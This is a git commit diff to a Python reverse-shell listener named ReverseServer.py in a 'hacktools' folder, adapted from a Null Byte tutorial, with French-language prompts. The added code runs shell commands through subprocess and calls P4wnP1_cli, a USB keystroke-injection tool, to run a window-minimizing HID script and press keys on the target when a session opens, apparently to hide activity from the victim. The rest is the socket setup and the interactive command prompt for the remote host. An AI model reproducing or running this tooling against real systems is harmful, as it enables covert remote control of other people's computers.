cb13236ce4c9597cb6cedffa6d7943b3164bd369
BeBoXoS <33153857+beboxos@users.noreply.github.com>
2019-01-23 16:18:53 +0100

    201901231618
    add functions

--- hacktools/ReverseServer.py
+++ hacktools/ReverseServer.py
@@ -2,7 +2,10 @@
 # source : https://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/
 # Modify by BeBoX 22.01.2019 auto add shell in cmd, corrected some errors
 # Set in FR language
-import socket, os, sys, time
+import socket, os, sys, time, subprocess
+hidcmd = "P4wnP1_cli hid run minimize.js"
+def shell(cmd):
+    return(subprocess.check_output(cmd, shell = True ))
 def socketCreate():
     try:
         global host
@@ -31,12 +34,13 @@ def socketAccept():
         conn, addr = s.accept()
         print('[!] Session ouverte a %s:%s'%(addr[0],addr[1]))
         print('\n')
-        print('Attente du client')
+        print('Attente du client\nTapez \'quit\' pour sortir')
         hostname = conn.recv(1024)
         menu()
     except socket.error as msg:
         print('Ereur acceptation du socket: ' + str(msg[0]))
 def menu():
+    shell("P4wnP1_cli hid run -c \"press('GUI DOWN')\"")
     while 1:
         cmd = raw_input(str(addr[0])+'@'+ str(hostname) + '> ')
         if cmd == 'quit':
